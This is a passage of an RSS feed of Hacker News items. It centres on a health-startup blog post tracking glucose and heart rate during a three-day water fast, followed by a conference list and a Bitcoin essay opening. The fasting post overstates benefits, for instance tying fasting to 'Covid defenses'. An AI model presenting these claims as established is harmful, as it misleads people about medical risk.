Fasting is generally easy to adopt and has important short and long-term health benefits such as metabolic, cardiovascular, and digestive health benefits. </p><p>Multi-day fasting is another form of fasting with a higher detoxifying effect that activates important an important cellular restoration process called autophagy. Autophagy is a super useful process that recycles, cleans up, and rids your body of damaged and misfolded proteins. When your cells are constantly fed, they aren't worried about efficiency and restoration - they're thinking that 'times are good, we don't need to work hard anymore.' In a well-fed state, your cells are only concerned with growing. Besides putting all their emphasis on growth, your well-fed cells also turn other genes off such as those related to fat metabolism, stress resistance, and damage repair. </p><p>During fasting (starvation), things are very different. We have a well-preserved starvation “program” that kicks our cell into a completely different state when food, particularly glucose or sugar, isn’t around. Your body reacts to the newfound stress by waking up cell functions to protect you and as a result, starts acting more efficiently and dynamically. This 'reactivation' of the cellular system leads to lowered inflammation, increases your brain's resistance to stress, and many other important long-term health benefits.</p><h2>So, what happens to your body on a fast?</h2><p>At Basis, we wanted to put the science to the test and really see what happens in real-time to your body when you’re following a prolonged fast. So I volunteered to be the guinea pig by spending last week doing a 3-day water fast and tracking my vitals in real-time with Basis to see the impact it has on my body.</p><p><img alt="Fasting data" src="https://images.ctfassets.net/xxkgr6gh5t72/3gyIfqHoGt8Iegl8jOcKxR/2eed6467ced1c30d17ca5fd14d27fbf3/Fasting_real_time_.png"></p><p>The Basis app added an extra layer of health confidence for me because I was getting real-time glucose data from my biosensor and could identify if I was going into a hypoglycemic attack; my wearable was connected to Basis and was giving me real-time heart rate data, and I was tracking my hydration and running a once-a-day urinalysis test in Basis to confirm that I wasn’t dealing with dehydration. In Basis, I was also getting my sleep reports for each night, including a time-specific snapshot of my glucose and heart rate - something of particular interest since more than 40% of hypoglycemic events happen during sleep. </p><p>For data sharing purposes, I also did a pre- and post-fast blood panel. You can see a table with the biomarkers I tested for at the top of this post. I've also provided body composition data because I'm sure most people think of fasting for weight loss purposes. </p><p>Disclaimer: Speak with your doctor before undertaking any type of fasting with or without Basis. Your doctor will advise you if any pre-existing condition or abnormalities in your biomarkers could create complications.</p><p>Without further ado, let’s jump into the Basis real-time data along with an explanation of the cellular process that happens as you hit different intervals in your fast. </p><h3><b>DAY 1</b></h3><p>Loading Chart</p><p>Glucose: Low 75 / High 119 / Average 94 </p><p>Glucose Variability: 10.31</p><p>Heart-rate: Low 49 / High 96 / Average 62</p><br><h4><b>12 hours - Hello ketosis. </b></h4><p>In this state, your body starts to break down and burn fat. This process creates ketones which serve as an alternative energy source when glucose isn’t available. </p><br><h4><b>18 hours - Fat-burning mode.</b> </h4><p>I'm now generating significant ketones and I can now begin to measure blood ketone levels above baseline values. Under normal conditions, the concentration of ketones in your plasma ranges below 20 mg/dL but when you fast this concentration can reach 80+ mg/dL. My ketones measured at 32 mg/dL compared to 80 mg/dL for my glucose. </p><br><h4><b>24 hours - Autophagy</b></h4><p>Autophagy can only happen when your glucose stores are significantly low. In humans, that usually happens after 24 hours of fasting. (Alirezaei et al., Autophagy 2010)</p><h3><b>DAY 2</b></h3><p>Loading Chart</p><p>Glucose: Low 69 / High 107 / Average 85 </p><p>Glucose variability: 9.96</p><p>Heart-rate: Low 45 / High 97 / Average 62 </p><br><h4><b>48 hours - Peak growth hormone</b> </h4><p>Growth hormone helps preserve lean muscle mass and reduces fat tissue accumulation, particularly as we age. It also appears to promote wound healing and cardiovascular health. After two days of fasting, the large number of circulating ketone bodies and the impact of ghrelin, the hunger hormone, promote increased growth hormone secretion (Hartman et al.,1992). </p><p>At this point in the fast, my glucose line is virtually flat, ranging between 75 - 85 mg/dL and I'm preserving my energy for essential activities and work. </p><h3><b>DAY 3</b></h3><p>Loading Chart</p><p>Glucose: Low 69 / High 90 / Average 78 </p><p>Glucose variability: 8.27</p><p>Heart-rate: Low 50 / High 120 / Average 64 </p><br><h4><b>72 hours - Checkpoint. </b></h4><p>At the 3-day mark, I've hit a key milestone in cellular regeneration. My body has broken down old immune cells and generated new ones (Cheng et al., 2014). Getting those Covid defenses up! Interestingly, through this same mechanism, prolonged fasting for at least 72 hours has been shown to also preserve healthy white blood cell or lymphocyte counts in patients undergoing chemotherapy. </p><p>Last ketone measurement before breaking the fast. Approaching the 80 mg/dL along with a 79mg/dL glucose level measurement.  </p><br><h4><b>Bonus stage: Refeeding!</b></h4><p>The fast isn’t done until you get some food back in your body. The most important thing to remember is that you should resist the temptation to chow down on a pizza or a burger because as amazing as that may seem in the moment, and trust me the temptation is always there, after 3 days of just sipping on water, it will feel absolutely terrible afterward. Your stomach has for all-intensive purposes shrunk and hasn’t gone through the process of digesting anything for 3 days. You’ll get bad stomach cramping and spend quite a bit of time in the bathroom if you eat a carb-heavy meal. </p><p>Beyond this practical reason, it’s important to break your fast with a nutritious, balanced meal that will further enhance the all-around cell and tissue health-boosting exercise you just undertook. </p><h3><b>Looking for a clearer view of your health?</b></h3><p><a href="https://basishealth.typeform.com/to/ovy5RnER">Sign up</a> for the Basis Early Access Beta and discover what having real-time access to your health data means. </p></div></div>]]>
            </description>
            <link>https://basishealth.io/blog/real-time-fasting-data-with-basis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817380</guid>
            <pubDate>Mon, 18 Jan 2021 02:04:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Civil rights pioneer Ruby Bridges on activism in the modern era]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25817179">thread link</a>) | @Anon84
<br/>
January 17, 2021 | https://artscanvas.org/arts-culture/civil-rights-pioneer-ruby-bridges-on-activism-in-the-modern-era | <a href="https://web.archive.org/web/*/https://artscanvas.org/arts-culture/civil-rights-pioneer-ruby-bridges-on-activism-in-the-modern-era">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>    <div>
        <div>
                            <div>
    <p>Top Stories</p>
    <div>
                    <article>
    <figure>
        <a href="https://artscanvas.org/music/watch-nurse-sings-amazing-grace-at-national-covid-remembrance">
                        <div>
                
                                <p>Watch</p>
            </div>
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/367ae84822413caf62c95b9ec5b4ed70-GettyImages-1230680894-768x511.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/367ae84822413caf62c95b9ec5b4ed70-GettyImages-1230680894-768x511.jpg" alt="">
                            </p>
        </a>
    </figure>
    <div>

        <div>

                        <p><a href="https://artscanvas.org/music">Music</a>

                        
        </p></div>

        <p><a href="https://artscanvas.org/music/watch-nurse-sings-amazing-grace-at-national-covid-remembrance"><span>WATCH: Nurse sings ‘Amazing Grace’ at national COVID remembrance</span></a></p><p>With the Reflecting Pool as a backdrop, and 400 lights lit up in honor of the 400,000 dead, Lori Marie…</p>
        
    </div>
</article>

                    <article>
    <figure>
        <a href="https://artscanvas.org/arts-culture/how-communities-across-the-country-are-honoring-covid-victims">
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/dfec21255ba8726802a3bce25c5f80db-GettyImages-1229959490-768x511.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/dfec21255ba8726802a3bce25c5f80db-GettyImages-1229959490-768x511.jpg" alt="">
                            </p>
        </a>
    </figure>
    <div>

        <div>

                        <p><a href="https://artscanvas.org/arts-culture">Arts &amp; Culture</a>

                        
        </p></div>

        <p><a href="https://artscanvas.org/arts-culture/how-communities-across-the-country-are-honoring-covid-victims"><span>How communities across the country are honoring COVID victims</span></a></p><p>From tiny flags to empty chairs, here's how different communities in the U.S. are memorializing the victims of the pandemic.</p>
        
    </div>
</article>

                    <article>
    <figure>
        <a href="https://artscanvas.org/books/the-advice-that-freed-jia-tolentino-from-the-worst-traps-in-both-life-and-writing">
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/bef38d9c2071261dc3bf2aeafea76377-Jia-Tolentino-c-Elena-Mudd-768x512.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/bef38d9c2071261dc3bf2aeafea76377-Jia-Tolentino-c-Elena-Mudd-768x512.jpg" alt="">
                            </p>
        </a>
    </figure>
    <div>

        <div>

                        <p><a href="https://artscanvas.org/books">Books</a>

                        
        </p></div>

        <p><a href="https://artscanvas.org/books/the-advice-that-freed-jia-tolentino-from-the-worst-traps-in-both-life-and-writing"><span>The advice that freed Jia Tolentino from ‘the worst traps in both life and writing’</span></a></p><p>Our January book club pick for Now Read This, the PBS NewsHour's book club with The New York Times, is…</p>
        
    </div>
</article>

                    <article>
    <figure>
        <a href="https://artscanvas.org/arts-culture/nascar-to-hold-pre-race-daytona-500-concert-with-luke-combs">
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/9e14a35bc9864eea0260551d4ec1ef12-2019-04-08T011606Z_1677011467_HP1EF4803IUE4_RTRMADP_3_AWARDS-ACM-768x508.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/9e14a35bc9864eea0260551d4ec1ef12-2019-04-08T011606Z_1677011467_HP1EF4803IUE4_RTRMADP_3_AWARDS-ACM-768x508.jpg" alt="">
                            </p>
        </a>
    </figure>
    <div>

        <div>

                        <p><a href="https://artscanvas.org/arts-culture">Arts &amp; Culture</a>

                        
        </p></div>

        <p><a href="https://artscanvas.org/arts-culture/nascar-to-hold-pre-race-daytona-500-concert-with-luke-combs"><span>NASCAR to hold pre-race Daytona 500 concert with Luke Combs</span></a></p><p>Combs performed virtually for NASCAR's season finale in November but has not done a live show since March. NASCAR prides…</p>
        
    </div>
</article>

                    <article>
    <figure>
        <a href="https://artscanvas.org/arts-culture/jazmine-sullivan-eric-church-h-e-r-to-sing-at-super-bowl">
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/c665a50791ebf70b14fdde9650a5bd3b-GettyImages-1288524603-768x432.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/c665a50791ebf70b14fdde9650a5bd3b-GettyImages-1288524603-768x432.jpg" alt="">
                            </p>
        </a>
    </figure>
    <div>

        <div>

                        <p><a href="https://artscanvas.org/arts-culture">Arts &amp; Culture</a>

                        
        </p></div>

        <p><a href="https://artscanvas.org/arts-culture/jazmine-sullivan-eric-church-h-e-r-to-sing-at-super-bowl"><span>Jazmine Sullivan, Eric Church, H.E.R. to sing at Super Bowl</span></a></p><p>R&amp;B star Jazmine Sullivan and country singer Eric Church will join forces to sing the national anthem at the next…</p>
        
    </div>
</article>

            </div>
    <p><a href="https://artscanvas.org/latest">View All Stories</a>
</p></div>                    </div>
    </div>
    <div>
        <div>
            
<div>
    <p>Most Popular</p>
    <div>
                    <article>
    <a href="https://artscanvas.org/arts-culture/poet-amanda-gorman-to-read-at-bidens-inauguration">
        <figure>
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/b6ff98366e01998f860aff56636f486e-Credit-Stephanie-Mitchell-150x150.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/b6ff98366e01998f860aff56636f486e-Credit-Stephanie-Mitchell-150x150.jpg" alt="">
                            </p>
        </figure>
        <p><span>Poet Amanda Gorman to read at Biden’s inauguration</span></p>
    </a>
</article>
                    <article>
    <a href="https://artscanvas.org/music/watch-vancouver-symphony-orchestra-performs-covid-tribute">
        <figure>
                        
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/92178476b0851f94415a50a9ab966288-Screen-Shot-2021-01-18-at-2.49.19-PM-1-150x150.png" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/92178476b0851f94415a50a9ab966288-Screen-Shot-2021-01-18-at-2.49.19-PM-1-150x150.png" alt="">
                            </p>
        </figure>
        <p><span>WATCH: Vancouver Symphony Orchestra performs COVID tribute</span></p>
    </a>
</article>
                    <article>
    <a href="https://artscanvas.org/books/the-advice-that-freed-jia-tolentino-from-the-worst-traps-in-both-life-and-writing">
        <figure>
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/bef38d9c2071261dc3bf2aeafea76377-Jia-Tolentino-c-Elena-Mudd-150x150.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/bef38d9c2071261dc3bf2aeafea76377-Jia-Tolentino-c-Elena-Mudd-150x150.jpg" alt="">
                            </p>
        </figure>
        <p><span>The advice that freed Jia Tolentino from ‘the worst traps in both life and writing’</span></p>
    </a>
</article>
                    <article>
    <a href="https://artscanvas.org/music/watch-nurse-sings-amazing-grace-at-national-covid-remembrance">
        <figure>
                        
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/367ae84822413caf62c95b9ec5b4ed70-GettyImages-1230680894-150x150.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/367ae84822413caf62c95b9ec5b4ed70-GettyImages-1230680894-150x150.jpg" alt="">
                            </p>
        </figure>
        <p><span>WATCH: Nurse sings ‘Amazing Grace’ at national COVID remembrance</span></p>
    </a>
</article>
                    <article>
    <a href="https://artscanvas.org/arts-culture/how-communities-across-the-country-are-honoring-covid-victims">
        <figure>
                        
            <p><img src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/dfec21255ba8726802a3bce25c5f80db-GettyImages-1229959490-150x150.jpg" data-src="https://d1f6suk63x5c7n.cloudfront.net/static/2021/01/dfec21255ba8726802a3bce25c5f80db-GettyImages-1229959490-150x150.jpg" alt="">
                            </p>
        </figure>
        <p><span>How communities across the country are honoring COVID victims</span></p>
    </a>
</article>
            </div>
</div>        </div>
        <div>
            
<div>

    <div>

        <div>
            <h2>Sign up for the best of CANVAS</h2>
            <p>Get Canvas delievered right to your inbox.</p>
        </div>

        <form name="" action="#" method="POST">
            
            
            

                        <p>Form error message goes here.</p>

                        <p>Thanks for subscribing. Please check your inbox to confirm your email address.</p>
        </form>

    </div>

    

</div>

        </div>
    </div>
    </div></div></div>]]>
            </description>
            <link>https://artscanvas.org/arts-culture/civil-rights-pioneer-ruby-bridges-on-activism-in-the-modern-era</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817179</guid>
            <pubDate>Mon, 18 Jan 2021 01:22:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Annoying Technology]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25817125">thread link</a>) | @ggoo
<br/>
January 17, 2021 | https://annoying.technology/posts/105f5623dedf07c7/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/105f5623dedf07c7/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><video controls="" autoplay="" loop="" muted="" preload="metadata">
<source src="https://d33wubrfki0l68.cloudfront.net/8d8a2daf5051a3e4d15c82e8a8e411459e44f014/038a1/media/negativespace.mp4" type="video/mp4">Your browser does not support the video tag.</video></p><p><a href="https://www.fuchen.xyz/">Fuchen</a> writes:</p><blockquote><p>In order to use Finder.app, you have to first learn the basics of graphic design. Because if you don’t, how would you be able to tell the positive space of an icon from the negative space of it, and click on the correct area in order to select the item?</p><p>Apparently the fruit company knows what item you want to select when you are clicking. It just wants to punish you for not being a good graphic design student (or maybe punish the developer for not embracing the Big Sur style icon).</p></blockquote><p>Hilarious. I think you could argue for not accepting the clicks outside of the icon, but clicking into the donut hole should select the donut. I can’t quite remember if it was in earlier versions of macOS or in Windows Explorer, but I’ve had similar problems when trying to select Finder/Explorer items and clicking into the empty space inside the <code>0</code> of e.g. a Date Modified timestamp, instead of hitting the number’s actually visible pixels.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/105f5623dedf07c7/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817125</guid>
            <pubDate>Mon, 18 Jan 2021 01:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2021 Virtual SaaS conferences list]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25817035">thread link</a>) | @item21153
<br/>
January 17, 2021 | https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list | <a href="https://web.archive.org/web/*/https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="blog-text"><p>The SaaS market is booming with the industry expected to reach $220.21 billion by 2022.</p><p>Whether you're an entrepreneur, SaaS founder or someone looking to innovate in your company, then attending one of these many SaaS conferences should be in your 2021 agenda.</p><p>But before you get too excited, know you're not going to be seated amongst an electric crowd, entranced by a booming voice like the image above.</p><p>Instead, expect a more pandemic-friendly alternative this year.</p><p>To help you out, we've compiled a list of the must-see online SaaS conferences you need to attend this year.</p><h2>Full list</h2><ul role="list"><li><a href="https://summit.productled.com/" target="_blank">Product-Led Summit </a>- January 26-28, 2021</li><li><a href="https://productschool.com/productcon/february/" target="_blank">ProductCon</a> - February 18th, 2021</li><li><a href="https://www.saastock.com/" target="_blank">SaaStock Remote</a> - February 23-25, 2021</li><li><a href="https://www.sxsw.com/" target="_blank">SXSW Online</a> - March 16-20, 2021</li><li><a href="https://theuxconf.com/" target="_blank">UX Conference</a> - March 1-2, 2021</li><li><a href="https://summit.adobe.com/na/" target="_blank">Adobe Summit</a> - April 13-15, 2021</li><li><a href="https://www.contentmarketingconference.com/" target="_blank">Content Marketing Annual Conference</a> - April 27-29, 2021</li><li><a href="https://www.ibm.com/events/think/" target="_blank">IBM Think 2021</a> - May 2021</li><li><a href="https://dublintechsummit.tech/" target="_blank">Dublin Tech Summit</a> - June 17th, 2021</li><li><a href="https://moz.com/mozcon" target="_blank">MozCon</a> - July 11-14, 2021</li><li><a href="https://www.inbound.com/2021" target="_blank">Inbound</a> - September 7-10, 2021</li><li><a href="https://techcrunch.com/events/techcrunch-disrupt-2021/#6141988e-b433-4082-ad44-e4b86a66c471" target="_blank">TechCrunch Disrupt</a> - &nbsp;September 21-23, 2021</li><li><a href="https://www.saastrannual2021.com/" target="_blank">SaaStr Annual 2021</a> - September 28-29, 2021</li><li><a href="https://websummit.com/" target="_blank">Websummit</a> - November 1-4, 2021</li></ul><p>‍</p><h2><strong>January</strong></h2><h4><a href="https://summit.productled.com/" target="_blank"><strong>Product-Led Summit—Virtual</strong></a><strong> </strong>- January 26-28, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe969e164b8421dea4ea33_Untitled.png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>If you're interested in product-led growth across customer onboarding, pricing strategies and retention acquisition, the online ProductLed Summit is for you. Over 250 of product trailblazers will teach you how to build a product-led growth company. These sessions are practical and exclusive so don't miss out!</p><p>‍</p><h2>February</h2><h4><a href="https://productschool.com/productcon/february/" target="_blank"><strong>ProductCon </strong></a>- February 18th, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe96d36a9726d18c3bf964_Untitled%20(1).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>ProductCon this year will highlight leaders from diverse backgrounds who have led the Product Industry. Over 15,000 inspirational speakers from leading tech companies such as Spotify, Amazon, Netflix and more.</p><p>‍</p><h4><a href="https://www.saastock.com/" target="_blank"><strong>SaaStock Remote</strong></a><strong> - February 23-25, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe96e6b92dbbad7b0de146_Untitled%20(2).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: US$59</p><p>SaaStock is showcasing SaaS founders, executives, and investors to share their experiences and tactics in a series of practical content sessions and workshops. Learn about the Saas market like never before and find the road to ultimate growth.</p><p>Other SaaStock events look out for:</p><ul role="list"><li>Online SaaStock LatAm - May 6 2021</li><li>Online SaaStock EMEA - October 11-13 2021</li><li>Online SaaStock APAC - September 2 2021</li></ul><p>‍</p><h2>March</h2><h4><a href="https://www.sxsw.com/" target="_blank"><strong>SXSW Online</strong></a><strong> - March 16-20, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe9702322c898da8c5eb8b_Untitled%20(3).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: $249</p><p>What to expect:</p><p>SXSW has invited reknown experts across industries such as business, tech, education, music and entertainment. From Film Festival screenings, networking opportunities, online exhibitions, and conference sessions, you will be spoilt for choice!</p><p>‍</p><h4><a href="https://theuxconf.com/" target="_blank"><strong>UX Conference</strong></a><strong> - March 1-2, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97201aacfc4913255a39_The-UX-Conference-1.jpg" loading="lazy" alt=""></p></figure><p>Timezone: UK</p><p>Price: £94.80</p><p>A two day immersive remote conference that hosts real-time online events. Learn from designers with experience working at 1Password, Amazon, Babylon, Discovery, Dropbox, Figma, Google, InVision, Shopify, TfL, Uber, what3words and more.</p><p>‍</p><h2><strong>April</strong></h2><h4><a href="https://summit.adobe.com/na/" target="_blank"><strong>Adobe Summit</strong></a><strong> - April 13-15, 2021</strong></h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe973e3e95d23737217b11_Untitled%20(4).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: Free</p><p>Come to this three-days conference if you are interested in optimising your customer experience, led by SaaS marketing experts, content managers and leading advertisers. Learn how to create positive and seamless experiences for customers with data and design through 200 sessions across campaign management, content creation, Adobe Experience Platform and Content Creation.</p><h4><a href="https://www.contentmarketingconference.com/" target="_blank"><strong>Content Marketing Annual Conference</strong></a> - April 27-29, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe975437f33b0701c1f594_Untitled%20(5).png" loading="lazy" alt=""></p></figure><p>Timezone: Eastern Standard Time</p><p>Price: &nbsp;US$799</p><p>Interested in content marketing? This conference is for you. Also enjoy the networking sessions with fellow content &amp;&nbsp;Saas marketers. Don't forget the benefits such as CMC 365 where you will have access to a plethora of educational content such as recordings, templates, guides and certified masterclasses.</p><h2><strong>May</strong></h2><h4><a href="https://www.ibm.com/events/think/" target="_blank"><strong>IBM Think 2021</strong></a> - May 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe977601a63b1d3e1280d8_Untitled%20(6).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>IBM Think is not an event to be missed! If you are working in IT, learn about the latest developments in data, blockchain, hybrid cloud and artificial intelligence. Stay ahead of the future with the best minds the industry.</p><p>‍</p><h2>June</h2><h4><a href="https://dublintechsummit.tech/" target="_blank"><strong>Dublin Tech Summit</strong></a><strong> </strong>- June 17th, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe9794ab4e52356b48dc2a_Untitled%20(7).png" loading="lazy" alt=""></p></figure><p>Timezone: Greenwich Mean time</p><p>Price: TBA</p><p>Dublin Tech Summit Virtual will feature more than 80 leading technology and business leaders from around the world. Participate in speaker panels and discover new ways to fast-track your business with speakers from HuaWei, NASA and Etsy.</p><p>‍</p><h2>July</h2><h4><a href="https://moz.com/mozcon" target="_blank"><strong>MozCon</strong></a> - July 11-14, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97ac322c8930c8c5ed39_Untitled%20(8).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: US$149</p><p>Dublin Tech Summit Virtual will feature more than 80 leading technology and business leaders from around the world to present on trends, findings and network with other great minds. Participate in speaker panels and discover new ways to fast-track your business with speakers from HuaWei, NASA and Etsy.</p><p>‍</p><h2>September</h2><h4><a href="https://www.inbound.com/2021" target="_blank"><strong>Inbound</strong></a> - September 7-10, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe8b838d5cbf3b1b0ab4cd_inbound-2021.png" alt="https://cdn.smartkarrot.com/wp-content/uploads/2021/01/inbound-2021.png"></p></figure><p>Timezone: Pacific Time</p><p>Price: US$49</p><p>INBOUND 2021 is an illuminative experience over four days, with experts across the globe, including networking sessions and high-energy talks. Hear from 250 professionals in product management, SaaS marketing and B2C/B2B startups.</p><h4><a href="https://techcrunch.com/events/techcrunch-disrupt-2021/#6141988e-b433-4082-ad44-e4b86a66c471" target="_blank"><strong>TechCrunch Disrupt</strong></a><strong> </strong>- &nbsp;September 21-23, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97e695a0a926fdf8c869_Untitled%20(9).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>TechCrunch Disrupt is three days of action-packed events with two segments: founders &amp; investors breaking barriers through disruptive technologies and ideas &amp; startup leaders providing valuable insights to entrepreneurs. With 10,000 attendees from around the globe, its guaranteed to be worth your time.</p><h4><a href="https://www.saastrannual2021.com/" target="_blank"><strong>SaaStr Annual 2021</strong></a> - September 28-29, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97f837f33b15d6c1f7eb_Untitled%20(10).png" loading="lazy" alt=""></p></figure><p>Timezone: Pacific Time</p><p>Price: TBA</p><p>SaaStr Annual is an online conference for SaaS founders, executives, and entrepreneurs looking to get enlightening advice to grow their business from $0 to $100M ARR. Sit in on many instructional workshops and mentoring opportunities from renowned SaaS leaders.</p><p>‍</p><h2>December</h2><h4><a href="https://websummit.com/" target="_blank"><strong>Websummit</strong></a> - November 1-4, 2021</h4><figure><p><img src="https://uploads-ssl.webflow.com/5fc569bc4e943c45698bc443/5ffe97ff417a3ed1fe7fb7ef_Untitled%20(11).png" loading="lazy" alt=""></p></figure><p>Timezone: Western European Standard Time</p><p>Price: 2 for 1 tickets for €850</p><p>Touted as 'the best technology conference on the planet' by Forbes, listen to 1100 tech speakers from companies such as Zoom, 23andMe, Facebook and Paypal - you won't regret it.</p><p>‍</p><p>That's a wrap for 2021! </p><p>And if, like us, you tend to scribble down notes from these events, <a href="https://meetric.app/">check out</a> what we're building.</p><p>‍</p><p>if you enjoyed this post, please do share the Twitter thread:</p></div></div></div>]]>
            </description>
            <link>https://www.meetric.app/blog/the-2021-virtual-saas-conferences-list</link>
            <guid isPermaLink="false">hacker-news-small-sites-25817035</guid>
            <pubDate>Mon, 18 Jan 2021 01:00:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Proof of Work Is Efficient]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25816797">thread link</a>) | @Reedx
<br/>
January 17, 2021 | https://www.danheld.com/blog/2019/1/5/pow-is-efficent | <a href="https://web.archive.org/web/*/https://www.danheld.com/blog/2019/1/5/pow-is-efficent">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
      

      

      <div>

        

        <div>
          

          <main>
            
              <section data-content-field="main-content">
                <article id="post-5c3185062b6a28cb40263ca2" data-item-id="5c3185062b6a28cb40263ca2">

    
      
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1546749209048" id="item-5c3185062b6a28cb40263ca2"><div><div><div data-block-type="2" id="block-7e36a634458f72c8b740"><div><p>Most people think Bitcoin’s PoW is “wasteful.” In this article, I explore how everything is energy, money is energy, energy usage is subjective, and PoW’s energy costs relative to existing governance systems. This article is a collection of direct thoughts from many individuals in the space — my value-add was in the aggregation, distillation, and combination of narratives.</p><h3>Work is&nbsp;Energy</h3><p>The idea of “work” being energy started when the French Mathematician&nbsp;<a href="https://en.wikipedia.org/wiki/Gaspard-Gustave_de_Coriolis" target="_blank">Gaspard-Gustave de Coriolis</a>&nbsp;introduced the idea of energy being “work done.”&nbsp;A long time ago, the work done in the economy was entirely human. That work was powered by food.</p><p>About a million years ago, humans&nbsp;stumbled across fire. As a result,&nbsp;the energy available to us increased because now we could keep warm not just from what we ate but also from burning. So this added energy usage improved our standard of living.</p><p>Some thousands of years ago, our energy usage increased still further when we domesticated animals. Animals could labor in our place. Those new laborers also had to be fed. Large amounts of food were required to meet the energy demand, and our prosperity increased alongside.</p><p>In the last few hundred years, we built great machines. Those mechanized machines produced work, first from sources like water &amp; wind, and then the cheaper sources like coal and gas, and now from nuclear sources (fission/fusion).&nbsp;Both machines and nature produce work through the utilization of energy.&nbsp;We have an economy based not on money, but on work and energy.</p><p>All things in our lives are closely linked to the price of energy.&nbsp;Purifying water requires energy. Transporting products requires energy. Manufacturing products requires energy. Cooking requires energy. Refrigerators and freezers require energy.&nbsp;In a free market, the cost of any good largely reflects the energy used in producing that good.&nbsp;Because free markets encourage the lowest priced goods, the energy used in&nbsp;producing&nbsp;any good is minimized.Money, which is the representation of the work required to generate goods and services, can also be viewed as stored energy.<br></p></div></div><div data-aspect-ratio="51.69491525423729" data-block-type="5" id="block-yui_3_17_2_1_1546761626522_12337"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
